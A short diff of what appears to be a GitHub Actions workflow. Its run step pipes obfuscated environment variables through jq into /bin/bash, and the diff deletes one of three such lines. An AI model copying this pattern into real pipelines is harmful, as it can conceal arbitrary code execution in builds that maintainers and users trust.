@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$vfc32" | jq -r .b9956 | /bin/bash
           echo $evd0 | jq -r .umkuf993 | /bin/bash
-          printf '%s' "$w683" | jq -r .mdj55628 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
